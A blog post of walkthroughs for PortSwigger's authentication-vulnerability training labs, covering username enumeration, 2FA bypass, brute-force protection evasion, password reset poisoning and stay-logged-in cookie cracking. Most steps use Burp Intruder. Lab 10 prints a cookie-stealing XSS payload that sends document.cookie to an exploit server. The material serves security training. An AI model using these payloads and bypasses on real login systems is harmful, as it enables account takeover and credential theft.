---
layout: post
title: PortSwigger - Authentication vulnerabilities labs
date: 2026-06-03 00:00:00 +0000
categories: [Writeups, PortSwigger, "Authentication"]
tags:
  - LABS
  - Authentication
  - PortSwigger
  - WebSecurity
subtitle: Walkthroughs for Labs 1-14
description: PortSwigger Web Security Academy - Authentication vulnerabilities labs
image: /assets/image/Portswigger/download.png
paginate: true
---

# PortSwigger – Authentication Vulnerabilities Labs

---

## LAB 1 — Username Enumeration via Different Responses

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration + password brute-force |
| **Goal** | Enumerate a valid username, brute-force the password, then access the account page |
| **Key Concept** | Different error messages reveal valid usernames — `Invalid username` vs `Incorrect password` |

### Steps

**1.** Login with wrong credentials → got `Invalid username`

![](/assets/labs/authenticationv/image-1.png)

**2.** Download the username and password lists from the lab description

![](/assets/labs/authenticationv/image-2.png)

**3.** Intercept the login request with Burp and send it to Intruder

![](/assets/labs/authenticationv/image-3.png)

**4.** Set the username field as payload position, load the username list, and start the attack — all responses show `Invalid username` except one: **`americas`**

![](/assets/labs/authenticationv/image-4.png)

**5.** With the valid username found, brute-force the password — filter for 30x redirects → password is **`password`**

![](/assets/labs/authenticationv/image-5.png)

**6.** Login with `americas` / `password` → Solved

![](/assets/labs/authenticationv/image-6.png)

---

## LAB 2 — 2FA Simple Bypass

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image-7.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | 2FA bypass |
| **Goal** | Access Carlos's account page |
| **Key Concept** | The app doesn't verify the 2FA step was completed — navigating directly to `/my-account` after entering valid credentials skips it entirely |

### Steps

**1.** Login with `wiener` / `peter` → the app asks for a 4-digit 2FA code

![](/assets/labs/authenticationv/image-8.png)

**2.** Click "Email Client" at the top of the lab

![](/assets/labs/authenticationv/image-9.png)

**3.** Find the code sent: `1723`

![](/assets/labs/authenticationv/image-10.png)

**4.** Enter the code → redirected to `/my-account`

![](/assets/labs/authenticationv/image-11.png)

**5.** Note the endpoint pattern: `/my-account?id=username`

![](/assets/labs/authenticationv/image-12.png)

**6.** Logout → login as `carlos` → 2FA prompt appears but there's no access to Carlos's email

![](/assets/labs/authenticationv/image-13.png)

**7.** The current endpoint at this point is `login2`

![](/assets/labs/authenticationv/image-14.png)

**8.** Change the URL directly to `/my-account` → Solved

![](/assets/labs/authenticationv/image-15.png)

---

## LAB 3 — Password Reset Broken Logic

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image-16.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Broken password reset |
| **Goal** | Reset Carlos's password then log in |
| **Key Concept** | The reset token isn't validated server-side — changing the `username` parameter in the request resets any user's password |

### Steps

**1.** Login with `wiener` / `peter`

![](/assets/labs/authenticationv/image-17.png)

**2.** Logout → click "Forgot password" → enter username → submit

![](/assets/labs/authenticationv/image-18.png)

**3.** Open the Email Client from the top of the page

![](/assets/labs/authenticationv/image-19.png)

**4.** Copy the reset link and start Burp to capture traffic

![](/assets/labs/authenticationv/image-20.png)

**5.** Open the link → "Set new password" page appears

![](/assets/labs/authenticationv/image-21.png)

**6.** Intercept the request when submitting the new password

![](/assets/labs/authenticationv/image-22.png)

**7.** Change the `username` parameter to `carlos` → send → success ✓

![](/assets/labs/authenticationv/image-23.png)

**8.** Login with `carlos` and the new password → Solved

![](/assets/labs/authenticationv/image-24.png)

---

## LAB 4 — Username Enumeration via Subtly Different Responses

> **Level:** `PRACTITIONER`

![](/assets/labs/authenticationv/image-26.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration |
| **Goal** | Find a valid username and password |
| **Key Concept** | The error message ends with a `.` for invalid credentials — but that period disappears when the username is valid |

### Steps

**1.** Download the username and password lists

![](/assets/labs/authenticationv/image-25.png)

**2.** Login with invalid credentials → intercept in Burp → send to Intruder

![](/assets/labs/authenticationv/image-27.png)

**3.** Brute-force the username field with the downloaded list

![](/assets/labs/authenticationv/image-28.png)

**4.** All responses return `Invalid username or password.` — do a **negative search** (filter out this string) to find the different one

![](/assets/labs/authenticationv/image-29.png)

**5.** One result stands out — the trailing `.` is missing → valid username: **`alpha`**

![](/assets/labs/authenticationv/image-30.png)

**6.** Brute-force the password for `alpha` using the password list

![](/assets/labs/authenticationv/image-31.png)

**7.** Filter for 30x redirects

![](/assets/labs/authenticationv/image-32.png)

**8.** Password found: **`jessica`** → login → Solved

![](/assets/labs/authenticationv/image-33.png)

---

## LAB 5 — Username Enumeration via Response Timing

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration and password brute-force attacks |
| **Goal** | Find a valid username and password |
| **Key Concept** | The app checks the username first, then the password. If the username is invalid it returns immediately. If valid, it proceeds to check the password — making it take longer. By sending a very long password and measuring response time, we can identify valid usernames. |

### Steps

**1.** Open the lab and go to My Account page

![](/assets/image/Portswigger/authee/image-1.png)

**2.** Try to login with invalid username or password and intercept the request with Burp

![](/assets/image/Portswigger/authee/image-2.png)

**3.** Send the request to Intruder — download the username and password lists from the lab main page

**4.** Select the username in Intruder, load the username list as payload, and start the attack

![](/assets/image/Portswigger/authee/image-3.png)

**5.** Got error: `You have made too many incorrect login attempts. Please try again in 30 minute(s).`

![](/assets/image/Portswigger/authee/image-4.png)

**6.** Use `X-Forwarded-For` header to change IP per request — switch to **Pitchfork** attack:

![](/assets/image/Portswigger/authee/image-5.png)

- Payload 1: Numbers 1–100
- Payload 2: Username list

**7.** Start the attack — the error disappears

![](/assets/image/Portswigger/authee/image-6.png)

**8.** Set a very long password to force the app to take more time when the username is valid

![](/assets/image/Portswigger/authee/image-7.png)

**9.** Start the attack again

**10.** Sort by **Response Complete** time

![](/assets/image/Portswigger/authee/image-8.png)

**11.** Identify the request that takes significantly longer

![](/assets/image/Portswigger/authee/image-9.png)

**12.** Username `app01` takes more time — confirm in Repeater

**13.** Set `app01` as the username in Intruder, load the password list, and start the attack

![](/assets/image/Portswigger/authee/image-10.png)

**14.** Filter responses for 30x redirects

![](/assets/image/Portswigger/authee/image-11.png)

**15.** Password found

![](/assets/image/Portswigger/authee/image-12.png)

**16.** Login with `app01` : `taylor` → Solved

![](/assets/image/Portswigger/authee/image-13.png)

---

## LAB 6 — Broken Brute-Force Protection, IP Block

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-14.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Logic flaw in password brute-force protection |
| **Goal** | Find a valid password for username `carlos` |
| **Key Concept** | The app blocks after 3 failed attempts. But logging in successfully with a valid account resets the counter. By alternating 2 failed attempts for `carlos` with 1 valid login as `wiener`, we can brute-force indefinitely. |

### Steps

**1.** Start the lab, intercept a login request with `carlos` and invalid password → send to Intruder

![](/assets/image/Portswigger/authee/image-15.png)

**2.** Go to **Resource Pool** → set max concurrent requests = 1

![](/assets/image/Portswigger/authee/image-16.png)

**3.** Build a credential list: 2 carlos attempts → 1 valid wiener login → repeat

```
carlos:password
carlos:password
wiener:peter
carlos:password
carlos:password
...
```

**4.** Python script to generate this pattern:

```python
print('usernames ------------------------------------------------------')
for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")

print('Passwords ------------------------------------------------------')
with open('password.txt', 'r') as f:
    line = f.readlines()

i = 0
for word in line:
    if i % 3:
        print(word.strip('\n'))
    else:
        print("peter")
        print(word.strip('\n'))
        i = i + 1
    i = i + 1
```

![](/assets/image/Portswigger/authee/image-17.png)

**5.** Copy all usernames and passwords into Burp Intruder — use **Pitchfork** attack

![](/assets/image/Portswigger/authee/image-18.png)

**6.** Start the attack

![](/assets/image/Portswigger/authee/image-19.png)

**7.** Filter output by `Incorrect password`

![](/assets/image/Portswigger/authee/image-20.png)

**8.** All wiener results show up — carlos's password appears once

![](/assets/image/Portswigger/authee/image-21.png)

**9.** Login with `carlos` : `matthew` → Solved

![](/assets/image/Portswigger/authee/image-22.png)

---

## LAB 7 — Username Enumeration via Account Lock

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-23.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration |
| **Goal** | Find a valid username and valid password |
| **Key Concept** | The app locks accounts after multiple failed attempts — but only for valid usernames. An invalid username returns no error regardless of how many attempts are made. This behavior reveals valid usernames. |

### Steps

**1.** Open the lab → intercept a login request → send to Intruder

![](/assets/image/Portswigger/authee/image-24.png)

**2.** Python script to repeat each username 10 times:

```python
print('usernames ------------------------------------------------------')
with open('username.txt', 'r') as f:
    lines = f.readlines()

for username in lines:
    for i in range(10):
        print(username.strip('\n'))
```

**3.** Copy the output and paste it as payload in Intruder

![](/assets/image/Portswigger/authee/image-25.png)

**4.** All responses contain `Invalid username or password.` — except one

![](/assets/image/Portswigger/authee/image-26.png)

**5.** Valid username found: **`info`** — now brute-force the password

![](/assets/image/Portswigger/authee/image-27.png)

Filter by:

![](/assets/image/Portswigger/authee/image-29.png)

**6.** All passwords return `You have made too many incorrect login attempts. Please try again in 1 minute(s).` — except one

![](/assets/image/Portswigger/authee/image-28.png)

**7.** Valid credentials found: `info` : `1234567890` → Solved

![](/assets/image/Portswigger/authee/image-30.png)

---

## LAB 8 — 2FA Broken Logic

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-31.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Flawed 2FA logic |
| **Goal** | Login as carlos |
| **Key Concept** | In the second authentication step, the app uses a `verify` cookie to determine which account's 2FA code to check. By intercepting the request and changing `verify` to `carlos`, we generate a 2FA code for carlos — then brute-force it. |

### Steps

**1.** Login with `wiener` : `peter` → intercept the `/login2` request

![](/assets/image/Portswigger/authee/image-32.png)

**2.** Change `verify=wiener` to `verify=carlos` and delete the session cookie → send

![](/assets/image/Portswigger/authee/image-33.png)

**3.** This generates a 2FA code for carlos's account

![](/assets/image/Portswigger/authee/image-34.png)

**4.** In the browser, submit an invalid 2FA code → intercept → send to Intruder

![](/assets/image/Portswigger/authee/image-36.png)

**5.** In Intruder: delete the session cookie, change `verify` to `carlos`

![](/assets/image/Portswigger/authee/image-37.png)

**6.** Set payload type to **Brute Forcer** (0000–9999)

![](/assets/image/Portswigger/authee/image-38.png)

**7.** Start the attack

**8.** Filter output for 302 responses

![](/assets/image/Portswigger/authee/image-39.png)

**9.** Found the valid code

![](/assets/image/Portswigger/authee/image-40.png)

**10.** Right-click → Show in browser

![](/assets/image/Portswigger/authee/image-41.png)

**11.** Solved

![](/assets/image/Portswigger/authee/image-42.png)

---

## LAB 9 — Brute-Forcing a Stay-Logged-In Cookie

> **Level:** `PRACTITIONER`

### Analysis

| | |
|---|---|
| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
| **Goal** | Login as carlos |
| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. Using a password list, the hash for `carlos` can be brute-forced to log in |

### Steps

**1.** Start the lab, login as `wiener` / `peter`, and check "Stay logged in"

![](/assets/labs/authenticationv/lll/image.png)

**2.** Logged in — go to "My account" and use the "Update email" button

![](/assets/labs/authenticationv/lll/image-1.png)

**3.** Reload the page and intercept the request with Burp

![](/assets/labs/authenticationv/lll/image-2.png)

**4.** Found the stay-logged-in cookie — send it to Decoder to inspect

![](/assets/labs/authenticationv/lll/image-3.png)

**5.** The first part decodes to the username `wiener:` followed by a colon

**6.** Send the second part to CrackStation to identify the hash type

![](/assets/labs/authenticationv/lll/image-4.png)

**7.** Confirmed the hash is MD5

**8.** Modify the request in Intruder to use `carlos` as the username, and remove the `id`, stay-logged-in, and session parameters from the request

![](/assets/labs/authenticationv/lll/image-6.png)

**9.** Download a password list, or copy one to a local file

![](/assets/labs/authenticationv/lll/image-7.png)

![](/assets/labs/authenticationv/lll/image-8.png)

**10.** Set up the payload in Intruder:

- First, hash each password with MD5

![](/assets/labs/authenticationv/lll/image-9.png)

- Add the prefix `carlos:`

![](/assets/labs/authenticationv/lll/image-10.png)

- Encode everything with Base64

![](/assets/labs/authenticationv/lll/image-11.png)

**11.** Start the attack and filter by `200` responses

![](/assets/labs/authenticationv/lll/image-12.png)

**12.** Found the valid password — right-click and choose "Show in browser"

![](/assets/labs/authenticationv/lll/image-13.png)

**13.** Copy the URL → open it in the browser → Solved

![](/assets/labs/authenticationv/lll/image-14.png)

---

## LAB 10 — Offline Password Cracking

> **Level:** `PRACTITIONER`

![](/assets/labs/authenticationv/lll/image-15.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
| **Goal** | Login as carlos and delete the account |
| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. By stealing carlos's cookie via XSS and cracking the hash with a password list, the account can be accessed and deleted |

### Steps

**1.** Start the lab and login as `wiener` / `peter` with "Stay logged in" checked

![](/assets/labs/authenticationv/lll/image-16.png)

**2.** Go to the home page, open any post, and submit a comment with the body:

```js
<script>document.location='$get your url form exploit server button$'+document.cookie</script>
```

![](/assets/labs/authenticationv/lll/image-17.png)

**3.** Submit the comment and check the exploit server's access log tab

![](/assets/labs/authenticationv/lll/image-18.png)

**4.** Carlos's stay-logged-in cookie appears — decode it with Burp to reveal the username `carlos` and the MD5 hash of the password

![](/assets/labs/authenticationv/lll/image-19.png)

**5.** Crack the MD5 hash using CrackStation

![](/assets/labs/authenticationv/lll/image-20.png)

**6.** Now we have the username `carlos` and the cracked password

![](/assets/labs/authenticationv/lll/image-21.png)

**7.** Login with these credentials

![](/assets/labs/authenticationv/lll/image-22.png)

**8.** Enter the password and delete the account → Solved

![](/assets/labs/authenticationv/lll/image-23.png)

---

## LAB 11 — Password Reset Poisoning via Middleware

> **Level:** `PRACTITIONER`

### Analysis

| | |
|---|---|
| **Vulnerability** | Password reset poisoning |
| **Goal** | Login as carlos |
| **Key Concept** | This lab covers the password reset poisoning vulnerability. When we request a new password using the forgot password functionality, it's possible to redirect the reset link to another host using the `X-Forwarded-Host` header. This allows us to steal the reset token and use it to change the password. |

### Steps

**1.** Start the lab and go to the account page

![alt text](/assets/labs/authenticationv/sdfasf/image-24.png)

**2.** Click "Forgot password" with Burp running in the background to record all requests

![alt text](/assets/labs/authenticationv/sdfasf/image-25.png)

**3.** Enter username `wiener` and click submit → go to the exploit server email client tab and get this link:

![alt text](/assets/labs/authenticationv/sdfasf/image-26.png)

**4.** This link redirects to the change password page

![alt text](/assets/labs/authenticationv/sdfasf/image-27.png)

**5.** Write the new password twice then submit

**6.** Password changed — all requests have been recorded in Burp HTTP history

![alt text](/assets/labs/authenticationv/sdfasf/image-28.png)

**7.** We need 3 requests:

- First: the request that takes our username to create the password reset link

![alt text](/assets/labs/authenticationv/sdfasf/image-29.png)

- Second: the request used to change the password

![alt text](/assets/labs/authenticationv/sdfasf/image-30.png)

- Third: the request where we send the new password

![alt text](/assets/labs/authenticationv/sdfasf/image-31.png)

**Send all to Repeater**

**8.** Inject the `X-Forwarded-Host` header in the first request → got `200 OK`

![alt text](/assets/labs/authenticationv/sdfasf/image-32.png)

**9.** Set the username to `carlos` and `X-Forwarded-Host` to our exploit server link

![alt text](/assets/labs/authenticationv/sdfasf/image-33.png)

**10.** Go to the exploit server access log → carlos's password reset token appears

![alt text](/assets/labs/authenticationv/sdfasf/image-34.png)

**11.** Use this token in the request to reset the password

![alt text](/assets/labs/authenticationv/sdfasf/image-35.png)

**12.** Got `302` — password changed and redirected to the login page

**13.** Login with `carlos` and the new password → Solved

![alt text](/assets/labs/authenticationv/sdfasf/image-36.png)

---

## LAB 12 — Password Brute-Force via Password Change

> **Level:** `PRACTITIONER`

### Analysis

| | |
|---|---|
| **Vulnerability** | Password change functionality vulnerable to brute-force attacks |
| **Goal** | Login as carlos |
| **Key Concept** | The password change form has 3 fields: current password and 2 fields for the new password. If the new passwords don't match it says `New passwords do not match`. If the current password is wrong AND the new passwords don't match, it says `Current password is incorrect`. This inconsistency bypasses brute-force protection. |

### Steps

**1.** Start the lab and login as `wiener` : `peter`

![alt text](/assets/labs/authenticationv/sdfasf/image-37.png)

**2.** Try to change the password with 2 different new passwords → get `New passwords do not match`

![alt text](/assets/labs/authenticationv/sdfasf/image-38.png)

**3.** Try to change the password with the wrong current password and 2 mismatched new passwords → get `Current password is incorrect`

![alt text](/assets/labs/authenticationv/sdfasf/image-39.png)

**4.** This means brute-force protection is bypassed when the new passwords don't match

**5.** Capture the traffic and send it to Intruder

![alt text](/assets/labs/authenticationv/sdfasf/image-40.png)

**6.** Set the username to `carlos`, set the current password as the attack position, and use 2 mismatched values for the new password fields — set the payload to the list from the lab description

**7.** Go to settings to filter the output and match `New passwords do not match`

![alt text](/assets/labs/authenticationv/sdfasf/image-41.png)

**8.** Start the attack

![alt text](/assets/labs/authenticationv/sdfasf/image-42.png)

**9.** One password returns `New passwords do not match`

![alt text](/assets/labs/authenticationv/sdfasf/image-43.png)

**10.** Login as `carlos` → Solved

![alt text](/assets/labs/authenticationv/sdfasf/image-44.png)

---

## LAB 13 — Broken Brute-Force Protection, Multiple Credentials per Request

> **Level:** `EXPERT`

### Analysis

| | |
|---|---|
| **Vulnerability** | Logic flaw in brute-force protection |
| **Goal** | Login as carlos |
| **Key Concept** | The login data is sent as JSON. If we send an array of passwords instead of a single value, the application processes all of them — and if the correct password is in the array, we get logged in. |

### Steps

**1.** Start the lab and download the password file from the lab description

![alt text](/assets/labs/authenticationv/qwer/image.png)

**2.** Open Burp and try to login with username `carlos` and an incorrect password

![alt text](/assets/labs/authenticationv/qwer/image-1.png)

**3.** Open the request in Burp HTTP history and check how the application sends the password — it's JSON

![alt text](/assets/labs/authenticationv/qwer/image-2.png)

**4.** If we try to brute-force normally, we have a limited number of attempts

![alt text](/assets/labs/authenticationv/qwer/image-3.png)

**5.** But if we send all passwords as an array of strings in JSON format, we force the application to try every element in the array

![alt text](/assets/labs/authenticationv/qwer/image-4.png)

**6.** Send the request to Repeater and use an LLM to put all passwords from the downloaded file into an array

![alt text](/assets/labs/authenticationv/qwer/image-5.png)

**7.** Copy the array and send it as the password value in JSON

![alt text](/assets/labs/authenticationv/qwer/image-7.png)

**8.** Click send and got a `302` redirect

![alt text](/assets/labs/authenticationv/qwer/image-8.png)

**9.** Following the redirect in Burp won't work — use "Show response in browser" instead

![alt text](/assets/labs/authenticationv/qwer/image-9.png)

**10.** Copy the link, open it in the browser → Solved

![alt text](/assets/labs/authenticationv/qwer/image-10.png)

---

## LAB 14 — 2FA Broken Logic with Session Handling Rule

> **Level:** `EXPERT`

![alt text](/assets/labs/authenticationv/qwer/image-11.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Weak 2FA implementation combined with a predictable 4-digit code and no effective protection against automated attempts |
| **Goal** | Access Carlos's account by brute-forcing the 2FA code |
| **Key Concept** | After two incorrect MFA attempts the application logs us out. To continue brute-forcing automatically, we use Burp Session Handling Rules with a Macro that re-authenticates as carlos before every Intruder request. Then we brute-force all possible 4-digit MFA codes until we receive a successful response. |

### Steps

**1.** Start the lab and login using the provided credentials for user `carlos` : `montoya`

![alt text](/assets/labs/authenticationv/qwer/image-13.png)

**2.** After login, the application asks for a 4-digit security code

![alt text](/assets/labs/authenticationv/qwer/image-12.png)

**3.** Enter any invalid code twice and notice that the application logs you out

![alt text](/assets/labs/authenticationv/qwer/image-14.png)

**4.** Because every two failed attempts terminate the session, we need Burp to automatically login again before each request

![alt text](/assets/labs/authenticationv/qwer/image-3.png)

![alt text](/assets/labs/authenticationv/qwer/image-15.png)

**5.** Go to **Settings → Sessions → Session Handling Rules** and create a new rule

![alt text](/assets/labs/authenticationv/qwer/image-16.png)

**6.** In the **Scope** tab select **Include all URLs**

![alt text](/assets/labs/authenticationv/qwer/image-17.png)

**7.** Go back to the **Details** tab and add a **Run a Macro** action

![alt text](/assets/labs/authenticationv/qwer/image-18.png)

**8.** Create a macro and record the following requests:

```http
GET /login
POST /login
GET /login2
```

![alt text](/assets/labs/authenticationv/qwer/image-19.png)

**9.** Test the macro and verify that the final response contains the page asking for the 4-digit security code

![alt text](/assets/labs/authenticationv/qwer/image-20.png)

**10.** Save all dialogs and return to Burp — the macro will now log in automatically before every Intruder request

**11.** Send the `POST /login2` request to Intruder

![alt text](/assets/labs/authenticationv/qwer/image-21.png)

**12.** Place a payload position on the `mfa-code` parameter

![alt text](/assets/labs/authenticationv/qwer/image-22.png)

**13.** Configure the payload type as **Numbers** with the following settings:

```
From: 0000
To:   9999
Step: 1
Min Integer Digits: 4
Max Fraction Digits: 0
```

![alt text](/assets/labs/authenticationv/qwer/image-23.png)

**14.** Create a Resource Pool and set **Maximum Concurrent Requests** to `1` so requests are processed sequentially

![alt text](/assets/labs/authenticationv/qwer/image-24.png)

**15.** Start the attack and wait for a response with status code `302`

![alt text](/assets/labs/authenticationv/qwer/image-25.png)

**16.** Once a `302` response is found, right-click it and choose **Show Response In Browser**

**17.** Copy the generated URL and open it in your browser

**18.** Click **My Account** → Solved

![alt text](/assets/labs/authenticationv/qwer/image-26.png)

---

### Result

The application invalidates the session after two failed MFA attempts, but Burp's Session Handling Rule automatically re-authenticates the user before each request. This allows us to brute-force all 10,000 possible 4-digit codes until the correct MFA value is found and access Carlos's account successfully.

---

**Finished — Happy Hacking!**

---

**Find me online:**
- TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)
- HackTheBox: [t4t4r1s](https://app.hackthebox.com/users/2203575)
- LinkedIn: [Mustafa Eltayeb](https://www.linkedin.com/in/t4t4r1s)
- X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>